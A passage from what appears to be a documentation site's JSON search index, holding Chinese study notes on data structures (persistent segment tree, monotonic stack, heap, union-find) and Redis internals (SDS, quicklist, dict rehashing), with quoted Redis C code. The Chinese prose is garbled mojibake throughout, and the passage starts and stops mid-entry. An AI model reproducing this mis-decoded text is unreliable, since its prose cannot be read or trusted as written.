"},{"id":198,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%BB%E5%B8%AD%E6%A0%91/","title":"ä¸»å¸­æ ‘","section":"æ•°æ®ç»“æ„","content":"ä¸»å¸­æ ‘ #   ä¸»å¸­æ ‘å…¨ç§°â€œå¯æŒä¹…åŒ–æƒå€¼çº¿æ®µæ ‘â€\n ä»€ä¹ˆæ˜¯â€œå¯æŒä¹…åŒ–æ•°æ®ç»“æ„â€ï¼Ÿ\n å¯æŒä¹…åŒ–æ•°æ®ç»“æ„ (Persistent data structure) æ€»æ˜¯å¯ä»¥ä¿ç•™æ¯ä¸€ä¸ªå†å²ç‰ˆæœ¬ï¼Œå¹¶ä¸”æ”¯æŒæ“ä½œçš„ä¸å¯å˜ç‰¹æ€§ (immutable)ã€‚  ä¸€ä¸ªæœ€æœ´ç´ çš„æ€è·¯æ˜¯æ¯ä¸ªç‰ˆæœ¬éƒ½ç»´æŠ¤ä¸€ä¸ªæ–°çš„çº¿æ®µæ ‘ï¼š\n\tRoot1\tRoot2\tRoot3 ï½œ\t|\t| åˆå§‹ç‰ˆæœ¬\tæ›´æ–°æ“ä½œ1\tæ›´æ–°æ“ä½œ2 ä¸€ä¸ªæ˜¾ç„¶çš„æ€è·¯æ˜¯ï¼šè¿™ä¸ªæ€è·¯çš„ç©ºé—´å¤æ‚åº¦ç‰¹åˆ«é«˜ã€‚\næˆ‘ä»¬çš„æŸæ¬¡æ›´æ–°æ“ä½œåªéœ€è¦æ›´æ”¹æŸä¸ªå¶å­ç»“ç‚¹çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å´éœ€è¦å¤åˆ¶æ•´ä¸ªçº¿æ®µæ ‘ã€‚â€œä¸»å¸­æ ‘â€å°±æ˜¯è¿™æ ·ä¸€ä¸ªå°†æå‡ç©ºé—´å¤æ‚åº¦åˆ©ç”¨ç‡çš„æ•°æ®ç»“æ„ã€‚æ¯”å¦‚ä¸‹å›¾ï¼š\nè“è‰²çš„æ˜¯åˆå§‹åŒ–çš„æ ‘ç»“æ„ï¼Œæ©™è‰²çš„èŠ‚ç‚¹æ˜¯è¿›è¡Œäº†ä¸€æ¬¡æ’å…¥ (value: 4, count: 2) ä¹‹åçš„ç¬¬äºŒä¸ªç‰ˆæœ¬çš„ç»“æ„ï¼Œå¯è§ç¬¬äºŒä¸ªç‰ˆæœ¬å¤ç”¨äº†ç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„éœ€æ±‚èŠ‚ç‚¹ã€‚åœ¨æŸ¥è¯¢æ—¶ä¸æ™®é€šçš„çº¿æ®µæ ‘ç±»ä¼¼ï¼Œé™¤äº†æˆ‘ä»¬éœ€è¦æŒ‡å®šåœ¨å“ªä¸ªç‰ˆæœ¬çš„æ ¹ç»“ç‚¹è¿›è¡ŒæŸ¥è¯¢ã€‚\n"},{"id":199,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8D%95%E8%B0%83%E6%A0%88/","title":"å•è°ƒæ ˆ","section":"æ•°æ®ç»“æ„","content":"å•è°ƒæ ˆ #  é¡¾åæ€ä¹‰ï¼Œå•è°ƒæ ˆå³æ»¡è¶³å•è°ƒæ€§çš„æ ˆç»“æ„ã€‚ä¸å•è°ƒé˜Ÿåˆ—ç›¸æ¯”ï¼Œå…¶åªåœ¨ä¸€ç«¯è¿›è¡Œè¿›å‡ºã€‚\nç›¸å¯¹äºæ™®é€šçš„æ ˆç»“æ„ï¼Œåœ¨å¤„ç†å•è°ƒæ ˆæ—¶éœ€è¦é¢å¤–åœ°å…³å¿ƒåœ¨è¿›è¡Œæ’å…¥æ“ä½œæ—¶éœ€è¦å°†è¿èƒŒå•è°ƒæ€§çš„æ–©é¡¶å…ƒç´ å…ˆå¼¹å‡ºã€‚ä»£ç ï¼š\nwhile (!sta.empty() \u0026amp;\u0026amp; sta.top() \u0026lt; x)  sta.pop() sta.push(x) åº”ç”¨ #  ç¦»çº¿è§£å†³ RMQ(Range Maximum/Minimum Query) é—®é¢˜ï¼Œå³æ±‚è§£ä¸€ä¸ªåŒºé—´ä¸­çš„æœ€å¤§ã€æœ€å°å€¼é—®é¢˜ã€‚\n"},{"id":200,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/","title":"å †","section":"æ•°æ®ç»“æ„","content":"å † #  ç®€ä»‹ #  å †æ˜¯ä¸€æ£µæ ‘ï¼Œå…¶æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªé”®å€¼ï¼Œä¸”æ¯ä¸ªèŠ‚ç‚¹çš„é”®å€¼éƒ½å¤§äºç­‰äº/å°äºç­‰äºå…¶çˆ¶äº²çš„é”®å€¼ã€‚\nè¿™ä¸€æ•°æ®ç»“æ„ï¼ˆè€ƒè™‘å°æ ¹å †ï¼Œå¤§æ ¹å †æ˜¯å¯¹ç§°çš„ï¼‰ä¸»è¦æ”¯æŒçš„æ“ä½œæœ‰ï¼šâ€œæ’å…¥ä¸€ä¸ªæ•°â€ã€â€œæŸ¥è¯¢æœ€å°å€¼â€ã€â€œåˆ é™¤æœ€å°å€¼â€ã€â€œåˆå¹¶ä¸¤ä¸ªå †â€ã€â€œå‡å°ä¸€ä¸ªå…ƒç´ çš„å€¼â€ã€‚\nå †çš„ç±»å‹ #  äºŒå‰å † #  æœ€å¸¸è§çš„å †ç»“æ„\né…å¯¹å †ï¼ˆå¯å¹¶å †ï¼‰ #  "},{"id":201,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B6%E6%9F%A5%E9%9B%86/","title":"å¹¶æŸ¥é›†","section":"æ•°æ®ç»“æ„","content":"å¹¶æŸ¥é›† #  ç®€ä»‹ #   å‚è€ƒï¼š\n https://visualgo.net/zh/ufds https://oi-wiki.org/ds/dsu/   å¹¶æŸ¥é›†æ˜¯ä¸€ç§æ ‘å½¢çš„æ•°æ®ç»“æ„ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒç”¨äºå¤„ç†ä¸€äº›ä¸äº¤é›†çš„ åˆå¹¶ åŠ æŸ¥è¯¢ é—®é¢˜ã€‚ å®ƒæ”¯æŒä¸¤ç§æ“ä½œï¼š\n æŸ¥æ‰¾ï¼ˆFindï¼‰ï¼šç¡®å®šæŸä¸ªå…ƒç´ å¤„äºå“ªä¸ªå­é›†ï¼› åˆå¹¶ï¼ˆUnionï¼‰ï¼šå°†ä¸¤ä¸ªå­é›†åˆå¹¶æˆä¸€ä¸ªé›†åˆã€‚  å¹¶æŸ¥é›†ä¼˜åŒ–ï¼šè·¯å¾„å‹ç¼©ï¼Œä¸å…³å¿ƒè¿æ¥çŠ¶æ€æ—¶ç›´æ¥æ‹¼æ¥åˆ°æ ¹ç»“ç‚¹ã€‚\nåº”ç”¨ #  ç›¸å…³ç®—æ³•ï¼š\n æœ€å°ç”Ÿæˆæ ‘ç®—æ³•ä¸­çš„ Kruskal\u0026rsquo;s algorithm å°±æ˜¯ç”¨çš„å¹¶æŸ¥é›†çš„æ€æƒ³ã€‚ æœ€è¿‘å…¬å…±ç¥–å…ˆä¸­çš„ Tarjan\u0026rsquo;s algorithm ä¹Ÿæ˜¯å¹¶æŸ¥é›†çš„æ€æƒ³ã€‚  ç›¸å…³é¢˜ç›®ï¼š\n  ã€ŒNOI2015ã€ç¨‹åºè‡ªåŠ¨åˆ†æ\n  ã€ŒJSOI2008ã€æ˜Ÿçƒå¤§æˆ˜\n  ã€ŒNOI2001ã€é£Ÿç‰©é“¾\n  ã€ŒNOI2002ã€é“¶æ²³è‹±é›„ä¼ è¯´\n  "},{"id":202,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/1.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/","title":"1.æ•°æ®ç»“æ„ä¸å¯¹è±¡","section":"Redis","content":"ç¬¬ä¸€éƒ¨åˆ†ï¼šæ•°æ®ç»“æ„ä¸å¯¹è±¡ #   å› ä¸ºé˜…è¯»çš„ä¹¦å·²ç»è¾ƒä¸ºè¿‡æ—¶ï¼Œæ–°çš„æ•°æ®ç»“æ„æ²¡æœ‰å®Œå…¨è®²å®Œï¼Œæ¯”å¦‚ï¼š\n zipmapã€quicklistã€stream   å­—ç¬¦ä¸² (Simple Dynamic String) #  Redis æ²¡æœ‰ä½¿ç”¨ C è¯­è¨€ä¸­çš„ \\0 ç»“å°¾çš„æ–¹å¼è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯è‡ªå·±æ„å»ºäº†ä¸€ä¸ªç»“æ„ SDS ä½œä¸ºåŸºæœ¬å­—ç¬¦ä¸²ç±»å‹ã€‚è¿™ä¸€ç»“æ„çš„å®šä¹‰å’Œå®ç°åˆ†åˆ«åœ¨æºç çš„ src/sds.hã€src/sds.c è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚\nç»“æ„ #  ä»¥æœ€é•¿ 256 å­—èŠ‚é•¿åº¦ä¸²çš„ç»“æ„ sdshdr8 ä¸ºä¾‹ï¼š\nstruct __attribute__ ((__packed__)) sdshdr8 {  uint8_t len; /* used */  uint8_t alloc; /* excluding the header and null terminator */  unsigned char flags; /* 3 lsb of type, 5 unused bits */  char buf[]; }; ç”±ä¸Šé¢çš„æºç å¯ä»¥çœ‹å‡º SDS ç»“æ„çš„æ ¸å¿ƒæ˜¯ï¼š\n  lenï¼šå·²ç»ä½¿ç”¨çš„å­—ç¬¦ä¸²é•¿åº¦ï¼›\n  allocï¼šæ€»å…±åˆ†é…çš„ç¼“å†²åŒºé•¿åº¦ï¼›\nSDS ä¸ºäº†å…¼å®¹ C è¯­è¨€çš„ç©ºå­—ç¬¦ä¸²ç»“å°¾ï¼Œä¼šé¢å¤–åˆ†é…ä¸€ä¸ªå­—èŠ‚çš„å¤§å°ï¼Œå¦‚æœå‡è®¾å­—ç¬¦ä¸²å¯ä»¥å¢åŠ çš„å¤§å°ä¸º rmdï¼Œé‚£ä¹ˆæœ‰å…¬å¼ï¼šalloc = rmd + len + 1ï¼›\n  bufï¼šå­—ç¬¦ä¸²å­—é¢é‡ï¼›\n  åƒå¤§å¤šæ•°é«˜çº§è¯­è¨€ä¸€æ ·ï¼Œä½¿ç”¨ç®€å•åŠ¨æ€å­—ç¬¦ä¸²è¿™ç§å°è£…æ–¹å¼æœ‰ä»¥ä¸‹å¥½å¤„ï¼š\n è·å–å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ—¶é—´å¤æ‚åº¦ O(1)ï¼› äºŒè¿›åˆ¶å®‰å…¨ï¼šæœç»ç¼“å†²åŒºæº¢å‡ºã€å¯ä»¥å­˜å‚¨äºŒè¿›åˆ¶å½¢å¼çš„å­—ç¬¦ä¸²ï¼› å‡å°‘ä¿®æ”¹å­—ç¬¦ä¸²æ‰€éœ€è¦çš„å†…å­˜é‡æ–°åˆ†é…æ¬¡æ•°ï¼› å…¼å®¹éƒ¨åˆ† C å­—ç¬¦ä¸²å‡½æ•°ï¼›  æ–¹æ³• #  sds çš„åˆ›å»ºæ ¸å¿ƒæ–¹æ³•å¯ä»¥çœ‹åˆ°æºç ä¸­çš„ _sdsnewlenï¼Œå®ƒçš„å‡½æ•°ç­¾åå¦‚ä¸‹ï¼š\nsds _sdsnewlen(const void *init, size_t initlen, int trymalloc) åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ° sds çš„å†…å­˜æ’åˆ—æ–¹å¼ï¼š\n s = (char*)sh+hdrlen;  fp = ((unsigned char*)s)-1;  usable = usable-hdrlen-1; å…¶ä¸­ s å°±æ˜¯ sds ç»“æ„ä¸­çš„ bufï¼Œå¹¶æœ€ç»ˆèµ‹å€¼ç»™äº† sds ç»“æ„æŒ‡é’ˆï¼›\né“¾è¡¨ (Linked List) #  æ™®é€šåŒç«¯é“¾è¡¨ #  Redis é“¾è¡¨çš„åº•å±‚æ˜¯ä¸€ä¸ªæ— ç¯åŒå‘é“¾è¡¨ï¼Œç»“æ„å¯ä»¥åœ¨ src/adlink.hã€src/adlink.c è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çœ‹åˆ°ã€‚adlink æ˜¯ A Generic Doubly Linked List çš„ç¼©å†™ã€‚\né“¾è¡¨çš„èŠ‚ç‚¹ä½¿ç”¨ç»“æ„ listNodeï¼š\ntypedef struct listNode {  struct listNode *prev;  struct listNode *next;  void *value; } listNode; é“¾è¡¨æœ¬èº«ä½¿ç”¨ç»“æ„ listï¼š\ntypedef struct list {  listNode *head;  listNode *tail;  void *(*dup)(void *ptr);  void (*free)(void *ptr);  int (*match)(void *ptr, void *key);  unsigned long len; } list; é™¤äº† å¤´èŠ‚ç‚¹ headã€å°¾èŠ‚ç‚¹ tailã€ä»¥åŠé“¾è¡¨é•¿åº¦ lenï¼Œç»“æ„ä¸­å¦å¤–ä¸‰ä¸ªæ˜¯ä¸‰ä¸ªå‡½æ•°ï¼š\n dup å‡½æ•°ç”¨äºå¤åˆ¶èŠ‚ç‚¹ï¼Œfree å‡½æ•°ç”¨äºé‡Šæ”¾èŠ‚ç‚¹ã€match å‡½æ•°ç”¨äºæ¯”è¾ƒèŠ‚ç‚¹ï¼› å› ä¸º listNode çš„ value å¯ä»¥æŒ‡å‘ä»»æ„å¯¹è±¡ï¼Œå› æ­¤éœ€è¦ä¸º list ç»“æ„çš„å®ä¾‹è®¾ç½®ä¸‰ä¸ªç”¨äºæ“ä½œèŠ‚ç‚¹çš„å‡½æ•°ï¼Œè¿™å…¶å®æ˜¯ä¸€ç§å¤šæ€çš„ä½“ç°ï¼›  ä½¿ç”¨å¿«é€Ÿé“¾è¡¨ #  Redis3.2ï¼Œåœ¨ quicklist implementation è¿™ä¸ª PR æäº¤ä¹‹åï¼ŒRedis å®ç°é“¾è¡¨è¿™ä¸€æ•°æ®å¯¹è±¡çš„é»˜è®¤æ–¹å¼ç”± ziplist/linkedlist å˜æˆäº† quicklistã€‚è¿™ç§å®ç°æ–¹å¼ç›¸å¯¹äºä¹‹å‰çš„å®ç°æœ‰ä»¥ä¸‹çš„å¥½å¤„ï¼š\n å¯¹äº linkedlist å®ç°çš„é“¾è¡¨ï¼Œå®¹æ˜“å½¢æˆå¾ˆå¤šå†…å­˜ç¢ç‰‡ï¼ŒæŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦å¯ä»¥è®¤ä¸ºæ˜¯ O(n)ï¼› è€Œå¯¹äº ziplist å®ç°çš„é“¾è¡¨ï¼Œæ¯æ¬¡æ‰§è¡Œæ’å…¥åˆ é™¤æ“ä½œæ—¶éƒ½ä¼šè¿›è¡Œå†…å­˜çš„é‡æ–°åˆ†é…ï¼›  å¿«é€Ÿé“¾è¡¨ quicklist çš„ç»“æ„ç®€å•åœ°è¯´å°±æ˜¯ä¸€ä¸ª ziplist çš„ linkedlistã€‚\nå¿«é€Ÿé“¾è¡¨ç»“æ„ #  quicklist æœ¬èº«çš„ç»“æ„ï¼š\n/* quicklist is a 40 byte struct (on 64-bit systems) describing a quicklist. * \u0026#39;count\u0026#39; is the number of total entries. * \u0026#39;len\u0026#39; is the number of quicklist nodes. * \u0026#39;compress\u0026#39; is: 0 if compression disabled, otherwise it\u0026#39;s the number * of quicklistNodes to leave uncompressed at ends of quicklist. * \u0026#39;fill\u0026#39; is the user-requested (or default) fill factor. * \u0026#39;bookmakrs are an optional feature that is used by realloc this struct, * so that they don\u0026#39;t consume memory when not used. */ typedef struct quicklist {  quicklistNode *head;  quicklistNode *tail;  unsigned long count; /* total count of all entries in all ziplists */  unsigned long len; /* number of quicklistNodes */  int fill : QL_FILL_BITS; /* fill factor for individual nodes */  unsigned int compress : QL_COMP_BITS; /* depth of end nodes not to compress;0=off */  unsigned int bookmark_count: QL_BM_BITS;  quicklistBookmark bookmarks[]; } quicklist; å…¶ä¸­ï¼Œé™¤äº†å®¹æ˜“ç†è§£çš„å‡ ä¸ªå‚æ•°ä¹‹å¤–ï¼š\n  fill çš„é»˜è®¤å€¼æ˜¯ 16ï¼Œè¢«æ³¨é‡Šä¸º fill factorï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå¯ä»¥åœ¨ .c æ–‡ä»¶çš„ _quicklistNodeAllowInsert å‡½æ•°æœ€åä¸‰è¡Œå¾—çŸ¥ï¼š\n if ((int)node-\u0026gt;count \u0026lt; fill)  return 1;  else  return 0; è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œå•ä¸ªèŠ‚ç‚¹çš„é•¿åº¦ä¸è¶…è¿‡ fill æ‰å¯ä»¥ç»§ç»­æ‰§è¡Œæ’å…¥ï¼Œæ‰€ä»¥ fill è¡¨å¾çš„æ˜¯è¿™äº› ziplist çš„å¤§å°ï¼›\n  compress çš„é»˜è®¤å€¼ä¹Ÿä¸º 16ï¼Œæ³¨é‡Šé‡Œè¯´å®ƒæ˜¯æ²¡æœ‰è¢«å‹ç¼©çš„èŠ‚ç‚¹æ•°é‡ã€‚å…·ä½“å¯ä»¥åœ¨ __quicklistCompress è¿™ä¸ªå‡½æ•°ä¸­çœ‹åˆ° compress è¿™ä¸ªå˜é‡çš„å…·ä½“ä½¿ç”¨æ–¹å¼ï¼š\n\tquicklistNode *forward = quicklist-\u0026gt;head;  quicklistNode *reverse = quicklist-\u0026gt;tail;  int depth = 0;  int in_depth = 0;  while (depth++ \u0026lt; quicklist-\u0026gt;compress) {  quicklistDecompressNode(forward);  quicklistDecompressNode(reverse);   if (forward == node || reverse == node)  in_depth = 1;   /* We passed into compress depth of opposite side of the quicklist * so there\u0026#39;s no need to compress anything and we can exit. */  if (forward == reverse || forward-\u0026gt;next == reverse)  return;   forward = forward-\u0026gt;next;  reverse = reverse-\u0026gt;prev;  } ä¸¾ä¸ªä¾‹å­è¯´å¦‚æœä¸€ä¸ª quicklist çš„é•¿åº¦ä¸º 20ï¼Œcompress çš„å€¼ä¸º 2ï¼Œé‚£ä¹ˆç¬¬ 0ã€1ã€18ã€19 è¿™å››ä¸ª quicklistNode åˆ™æ˜¯æ²¡æœ‰å‹ç¼©çš„ï¼›\n  bookmarks ä¸ bookmark_count æ˜¯ä¸€ä¸ªä¸ºäº†åŠ é€Ÿè®¿é—®çš„ï¼Œé¢å‘ Redis ä½¿ç”¨è€…çš„å·¥å…·ï¼Œå®ƒæä¾›äº†ä»¥ O(1) åˆ°è¾¾æŸä¸ªå…·ä½“ä½ç½®çš„èƒ½åŠ›ã€‚\n  Bookmark çš„ä½¿ç”¨å¯ä»¥æŸ¥çœ‹å®ƒç»“æ„å®šä¹‰ä½ç½®çš„æ³¨é‡Šï¼š\n/* Bookmarks are padded with realloc at the end of of the quicklist struct. * They should only be used for very big lists if thousands of nodes were the * excess memory usage is negligible, and there\u0026#39;s a real need to iterate on them * in portions. * When not used, they don\u0026#39;t add any memory overhead, but when used and then * deleted, some overhead remains (to avoid resonance). * The number of bookmarks used should be kept to minimum since it also adds * overhead on node deletion (searching for a bookmark to update). */ typedef struct quicklistBookmark {  quicklistNode *node;  char *name; } quicklistBookmark; åªæœ‰åœ¨ quicklist ç‰¹åˆ«å¤§ï¼Œè€Œåˆæœ‰å¼ºçƒˆçš„å±€éƒ¨è®¿é—®è¯‰æ±‚æ—¶ï¼Œæ‰å»ºè®®ä½¿ç”¨å®ƒã€‚å¦åˆ™å®ƒä¸ä¼šå¢åŠ  quicklist çš„å†…å­˜å¼€é”€ã€‚\nquicklistNode ç»“æ„çš„å®šä¹‰å¦‚ä¸‹ï¼š\n/* quicklistNode is a 32 byte struct describing a ziplist for a quicklist. * We use bit fields keep the quicklistNode at 32 bytes. * count: 16 bits, max 65536 (max zl bytes is 65k, so max count actually \u0026lt; 32k). * encoding: 2 bits, RAW=1, LZF=2. * container: 2 bits, NONE=1, ZIPLIST=2. * recompress: 1 bit, bool, true if node is temporary decompressed for usage. * attempted_compress: 1 bit, boolean, used for verifying during testing. * extra: 10 bits, free for future use; pads out the remainder of 32 bits */ typedef struct quicklistNode {  struct quicklistNode *prev;  struct quicklistNode *next;  unsigned char *zl;  unsigned int sz; /* ziplist size in bytes */  unsigned int count : 16; /* count of items in ziplist */  unsigned int encoding : 2; /* RAW==1 or LZF==2 */  unsigned int container : 2; /* NONE==1 or ZIPLIST==2 */  unsigned int recompress : 1; /* was this node previous compressed? */  unsigned int attempted_compress : 1; /* node can\u0026#39;t compress; too small */  unsigned int extra : 10; /* more bits to steal for future usage */ } quicklistNode; æ³¨é‡Šä¸­å¯ä»¥çœ‹å‡ºæ­¤å¤„ç”¨çš„å‹ç¼©æ–¹å¼æ˜¯ lzfï¼Œå®ƒçš„å‹ç¼©è§£å‹ç¼©å‡½æ•°åœ¨ lzf_c.c - lzf_compress/lzf_d.c - lzf_decompress è¿™ä¸¤ä¸ªå‡½æ•°ä¸­ã€‚\nå­—å…¸ (Hash Table) #  å­—å…¸çš„ç»“æ„ä¸æ ¸å¿ƒæ–¹æ³•å¯ä»¥åœ¨ src/dict.c ä¸ src/dict.h è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çœ‹åˆ°ã€‚\nç»“æ„ #  å®ç°å­—å…¸çš„ç»“æ„ä¸­è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠäº†ä¸‰ä¸ªæ ¸å¿ƒç»“æ„ã€‚\nå­—å…¸æœ¬èº«ä½¿ç”¨ dict è¿™ä¸ªç»“æ„å®ç°çš„ï¼š\ntypedef struct dict {  dictType *type;  void *privdata;  dictht ht[2];  long rehashidx; /* rehashing not in progress if rehashidx == -1 */  int16_t pauserehash; /* If \u0026gt;0 rehashing is paused (\u0026lt;0 indicates coding error) */ } dict;  è·Ÿ list ç±»ä¼¼ï¼Œå…¶ä¸­ dictType æ˜¯ä¸€ä¸ªä¸ºäº†å®ç°å¤šæ€çš„å‡½æ•°æŒ‡é’ˆå°è£…ï¼› dictht ç»“æ„æ‰æ˜¯å®ç°å­—å…¸çš„æ ¸å¿ƒç»“æ„ï¼› dict æŒæœ‰ä¸¤ä¸ª dictht å¹¶ä¸”å®šä¹‰äº† rehashidx/rehashidx è¿™äº›æˆå‘˜å˜é‡ï¼Œæ˜¯ä¸ºäº† rehash çš„æ€§èƒ½ä¸å¯ç”¨æ€§çš„è€ƒè™‘ï¼›  å“ˆå¸Œè¡¨ä½¿ç”¨ dictht å®ç°ï¼š\ntypedef struct dictht {  dictEntry **table;  unsigned long size;  unsigned long sizemask;  unsigned long used; } dictht; å…¶ä¸­ dictEntry æ˜¯ä»¥é“¾å¼å­˜å‚¨çš„å“ˆå¸Œè¡¨èŠ‚ç‚¹ï¼š\ntypedef struct dictEntry {  void *key;  union {  void *val;  uint64_t u64;  int64_t s64;  double d;  } v;  struct dictEntry *next; } dictEntry; é€šè¿‡ next å­—æ®µå¯ä»¥çœ‹å‡º dictEntry çš„æœ¬è´¨æ˜¯ä¸€ä¸ªé“¾è¡¨çš„èŠ‚ç‚¹ï¼Œå“ˆå¸Œè¡¨é€šè¿‡è¿™ç§æ–¹å¼è§£å†³å“ˆå¸Œå†²çªï¼›\nå“ˆå¸Œç®—æ³• #  å“ˆå¸Œç®—æ³•æ˜¯å“ˆå¸Œè¡¨å®ç°çš„é‡ç‚¹ï¼Œåœ¨ä»£ç çš„æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤çš„å“ˆå¸Œç®—æ³•æ˜¯ siphashï¼Œè¯¥ç®—æ³•åœ¨ siphash.c è¿™ä¸ªæ–‡ä»¶ä¸­å®ç°ã€‚\nRehash å¤§å° #  Redis çš„å“ˆå¸Œè¡¨è®¾è®¡å·§å¦™ä¹‹å¤„æ­£åœ¨äº Rehash çš„æ–¹æ³•å®ç°ã€‚\nè°ƒæ•´å¤§å°çš„æ ¸å¿ƒæ–¹æ³•æ˜¯ï¼š\nint _dictExpand(dict *d, unsigned long size, int* malloc_failed) æŸ¥çœ‹è¿™ä¸ªæ–¹æ³•çš„å®ç°ï¼Œå¯ä»¥çŸ¥é“å‡½æ•°é€šè¿‡ _dictNextPower æ¥è®¡ç®—é¢„æœŸçš„å¤§å°ã€‚è¿™ä¸ªæ–¹æ³•ä¸­ä¼šæ ¹æ® size è®¡ç®—å®é™…é¢„æœŸçš„å¤§å°ï¼Œè¿™ä¸ªè®¡ç®—æ–¹æ³•æ˜¯ï¼š\nstatic unsigned long _dictNextPower(unsigned long size) {  unsigned long i = DICT_HT_INITIAL_SIZE;\t// 4  if (size \u0026gt;= LONG_MAX) return LONG_MAX + 1LU;  while(1) {  if (i \u0026gt;= size)  return i;  i *= 2;  } } æŸ¥çœ‹è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ï¼Œå¯ä»¥å¾—åˆ°åœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹ä¼šè§¦å‘ Rehashï¼š\n/* Expand the hash table if needed */ static int _dictExpandIfNeeded(dict *d) {  /// ... \t/* If we reached the 1:1 ratio, and we are allowed to resize the hash * table (global setting) or we should avoid it but the ratio between * elements/buckets is over the \u0026#34;safe\u0026#34; threshold, we resize doubling * the number of buckets. */  if (d-\u0026gt;ht[0].used \u0026gt;= d-\u0026gt;ht[0].size \u0026amp;\u0026amp;  (dict_can_resize ||  d-\u0026gt;ht[0].used/d-\u0026gt;ht[0].size \u0026gt; dict_force_resize_ratio) \u0026amp;\u0026amp;  dictTypeExpandAllowed(d))  {  return dictExpand(d, d-\u0026gt;ht[0].used + 1);  }  /// ... } è€Œ _dictExpandIfNeeded åˆ™ä¼šåœ¨æ¯æ¬¡ä½¿ç”¨ _dictKeyIndex æ’å…¥æ–°çš„ key æ—¶è°ƒç”¨ã€‚\nRehash æµç¨‹ #  å¦‚æœä½¿ç”¨æ™®é€šçš„ rehash æ–¹æ¡ˆå…¨å±€è°ƒæ•´å¹¶ä¸”å¤åˆ¶ï¼Œåœ¨æ•°æ®é‡è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´æœåŠ¡å™¨çŸ­æš‚çš„å®•æœºã€‚\nå› æ­¤ Redis è®¾è®¡äº†ä¸€ä¸ªæ¸è¿›å¼çš„ Rehash æ–¹å¼ï¼Œæ¸è¿›å¼åœ°å¤šæ¬¡å®Œæˆï¼Œè€Œä¸æ˜¯é›†ä¸­åœ°ä¸€æ¬¡å®Œæˆã€‚å…·ä½“çš„ï¼Œåœ¨ Rehash çš„è¿‡ç¨‹ä¸­ ï¼Œdict ä¼šå­˜å‚¨ä¸¤ä»½ dictht æ•°æ®ï¼Œæ‰€æœ‰çš„å¢åˆ æ”¹æŸ¥æ“ä½œéƒ½ä¼šåœ¨è¿™ä¸¤ä¸ªè¡¨ä¸­è¿›è¡Œã€‚\nRehash çš„åŸå­æ­¥éª¤æ˜¯æºç ä¸­çš„ dictRehash è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒçš„ç­¾åå’Œæ³¨é‡Šå¦‚ä¸‹ï¼š\n/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */ int dictRehash(dict *d, int n) åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä»¥ rehashidx ä¸ºæ ‡è®°ï¼ŒæŠŠä¹‹åè¿ç»­çš„ n ä¸ªè®°å½•ä» ht[0] è¿ç§»åˆ° ht[1]ã€‚æ¯å½“ä¸€ä¸ªå…ƒç´ ä» ht[0] è¿ç§»åˆ° ht[1]ï¼Œå‡½æ•°ä¼šæ›´æ”¹ used å­—æ®µåŒæ—¶ç»´æŒ size å­—æ®µä¸å˜ï¼Œht[0] ä¸­å¯¹åº”ä¸‹æ ‡ä½ç½®çš„æŒ‡é’ˆå°†ä¼šè¢«æŒ‡å‘ä¸º NULLã€‚\næŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨æ ˆå¯ä»¥åˆ†æ Redis å…·ä½“æ˜¯å¦‚ä½•æ‰§è¡Œ Rehash æ“ä½œçš„ã€‚\n  dictRehashMillisecondsï¼šå‡½æ•°æ¥æ”¶ä¸€ä¸ªä»¥ ms ä¸ºå•ä½çš„æ—¶é—´å‚æ•°ï¼Œå‡½æ•°å†…éƒ¨æ¯æ¬¡ â€œè¿ç§» 100 ä¸ªå…ƒç´ â€ä¸ºåŸå­æ“ä½œï¼Œè¿›è¡Œæ‰§è¡Œæ—¶é—´ä¸è¶…è¿‡è¿™ä¸ªä¸Šé™çš„ rehashã€‚\nåœ¨ server.c æ–‡ä»¶ä¸­é€šè¿‡è°ƒç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œ rehash æ“ä½œï¼Œæ¯ 100ms ä¼šå ç”¨å°äº 1ms 